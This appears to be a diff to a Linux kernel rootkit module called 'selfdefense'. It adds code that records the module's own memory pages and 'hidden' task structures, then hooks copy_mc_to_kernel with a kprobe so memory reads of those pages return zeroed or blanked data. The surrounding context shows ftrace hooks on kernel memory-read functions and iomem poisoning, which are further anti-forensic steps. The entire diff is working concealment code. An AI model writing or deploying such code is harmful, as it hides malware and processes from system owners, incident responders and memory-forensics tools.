@@ -321,6 +321,188 @@ static notrace void sd_restore_iomem(void)
     }
 }
 
+#define SD_MAX_MOD_PAGES 2048
+static unsigned long sd_mod_phys_pages[SD_MAX_MOD_PAGES];
+static int           sd_mod_phys_count = 0;
+
+static void sd_init_mod_pages(void)
+{
+    unsigned long va, size, offset;
+    struct page *pg;
+
+    sd_mod_phys_count = 0;
+
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 4, 0)
+    {
+        enum mod_mem_type s;
+        for (s = 0; s < MOD_MEM_NUM_TYPES; s++) {
+            va   = (unsigned long)THIS_MODULE->mem[s].base;
+            size = THIS_MODULE->mem[s].size;
+            if (!va || !size)
+                continue;
+            for (offset = 0; offset < size &&
+                 sd_mod_phys_count < SD_MAX_MOD_PAGES; offset += PAGE_SIZE) {
+                pg = vmalloc_to_page((void *)(va + offset));
+                if (pg)
+                    sd_mod_phys_pages[sd_mod_phys_count++] =
+                        page_to_phys(pg) & PAGE_MASK;
+            }
+        }
+    }
+#else
+    va   = (unsigned long)THIS_MODULE->core_layout.base;
+    size = THIS_MODULE->core_layout.size;
+    for (offset = 0; offset < size && sd_mod_phys_count < SD_MAX_MOD_PAGES;
+         offset += PAGE_SIZE) {
+        pg = vmalloc_to_page((void *)(va + offset));
+        if (pg)
+            sd_mod_phys_pages[sd_mod_phys_count++] = page_to_phys(pg) & PAGE_MASK;
+    }
+#endif
+}
+
+static notrace bool sd_is_mod_page(unsigned long phys)
+{
+    int i;
+    phys &= PAGE_MASK;
+    for (i = 0; i < sd_mod_phys_count; i++)
+        if (sd_mod_phys_pages[i] == phys)
+            return true;
+    return false;
+}
+
+static char sd_zero_page[PAGE_SIZE] __attribute__((aligned(PAGE_SIZE)));
+
+static char sd_scratch_page[PAGE_SIZE] __attribute__((aligned(PAGE_SIZE)));
+
+#define SD_MAX_PARTIAL 256
+struct sd_partial_entry {
+    unsigned long phys;
+    unsigned long off;
+    unsigned long len;
+};
+static struct sd_partial_entry sd_partial[SD_MAX_PARTIAL];
+static int sd_partial_count = 0;
+static DEFINE_SPINLOCK(sd_pages_lock);
+
+notrace void sd_register_phys_range(const void *va, size_t size)
+{
+    unsigned long addr = (unsigned long)va & PAGE_MASK;
+    unsigned long end  = (unsigned long)va + size;
+    unsigned long flags;
+
+    while (addr < end) {
+        unsigned long pg_end = addr + PAGE_SIZE;
+        unsigned long off    = ((unsigned long)va > addr)
+                                ? ((unsigned long)va - addr) : 0;
+        unsigned long len    = min(pg_end, end) - (addr + off);
+        unsigned long phys;
+        int i;
+
+        if (virt_addr_valid((void *)addr))
+            phys = virt_to_phys((void *)addr) & PAGE_MASK;
+        else {
+            struct page *pg = vmalloc_to_page((void *)addr);
+            phys = pg ? (page_to_phys(pg) & PAGE_MASK) : 0;
+        }
+
+        if (phys) {
+            spin_lock_irqsave(&sd_pages_lock, flags);
+            for (i = 0; i < sd_partial_count; i++) {
+                if (sd_partial[i].phys == phys &&
+                    sd_partial[i].off == off) {
+                    if (len > sd_partial[i].len)
+                        sd_partial[i].len = len;
+                    goto next;
+                }
+            }
+            if (sd_partial_count < SD_MAX_PARTIAL) {
+                sd_partial[sd_partial_count].phys = phys;
+                sd_partial[sd_partial_count].off  = off;
+                sd_partial[sd_partial_count].len  = len;
+                sd_partial_count++;
+            }
+next:
+            spin_unlock_irqrestore(&sd_pages_lock, flags);
+        }
+
+        addr += PAGE_SIZE;
+    }
+}
+
+notrace void sd_register_hidden_task(struct task_struct *task)
+{
+    if (task)
+        sd_register_phys_range(task, sizeof(*task));
+}
+
+static struct kprobe sd_copy_mc_kp;
+static int sd_copy_mc_kp_active = 0;
+
+static int notrace sd_copy_mc_pre(struct kprobe *p, struct pt_regs *regs)
+{
+    void *src = (void *)regs->si;
+    unsigned long phys = 0;
+    int i, found_partial = 0;
+
+    if (!sd_mod_phys_count && !sd_partial_count)
+        return 0;
+
+    if (virt_addr_valid(src)) {
+        phys = virt_to_phys(src) & PAGE_MASK;
+    } else {
+        struct page *pg = vmalloc_to_page(src);
+        if (pg)
+            phys = page_to_phys(pg) & PAGE_MASK;
+    }
+
+    if (!phys)
+        return 0;
+
+    if (sd_is_mod_page(phys)) {
+        regs->si = (unsigned long)sd_zero_page;
+        return 0;
+    }
+
+    for (i = 0; i < sd_partial_count; i++) {
+        if (sd_partial[i].phys != phys)
+            continue;
+        if (!found_partial) {
+            memcpy(sd_scratch_page, src, PAGE_SIZE);
+            found_partial = 1;
+        }
+        memset(sd_scratch_page + sd_partial[i].off, 0, sd_partial[i].len);
+    }
+    if (found_partial)
+        regs->si = (unsigned long)sd_scratch_page;
+
+    return 0;
+}
+
+static int sd_copy_mc_kprobe_install(void)
+{
+    unsigned long addr = (unsigned long)resolve_sym("copy_mc_to_kernel");
+    int ret;
+
+    if (!addr)
+        return -ENOENT;
+    memset(&sd_copy_mc_kp, 0, sizeof(sd_copy_mc_kp));
+    sd_copy_mc_kp.pre_handler = sd_copy_mc_pre;
+    sd_copy_mc_kp.addr        = (kprobe_opcode_t *)addr;
+    ret = register_kprobe(&sd_copy_mc_kp);
+    if (ret == 0)
+        sd_copy_mc_kp_active = 1;
+    return ret;
+}
+
+static void sd_copy_mc_kprobe_remove(void)
+{
+    if (sd_copy_mc_kp_active) {
+        unregister_kprobe(&sd_copy_mc_kp);
+        sd_copy_mc_kp_active = 0;
+    }
+}
+
 static struct ftrace_hook sd_hooks_core[] = {
     HOOK("copy_from_kernel_nofault", hook_copy_from_kernel_nofault,
                                      &orig_copy_from_kernel_nofault),
@@ -344,6 +526,7 @@ notrace int selfdefense_init(void)
     int err;
 
     sd_resource_lock = (rwlock_t *)resolve_sym("resource_lock");
+    sd_init_mod_pages();
 
     err = fh_install_hooks(sd_hooks_core, ARRAY_SIZE(sd_hooks_core));
     if (err)
@@ -357,6 +540,8 @@ notrace int selfdefense_init(void)
         }
     }
 
+    sd_copy_mc_kprobe_install();
+
     sd_poison_iomem();
 
     return 0;
@@ -365,6 +550,7 @@ notrace int selfdefense_init(void)
 notrace void selfdefense_exit(void)
 {
     sd_restore_iomem();
+    sd_copy_mc_kprobe_remove();
 
     fh_remove_hooks(sd_hooks_core, ARRAY_SIZE(sd_hooks_core));
 
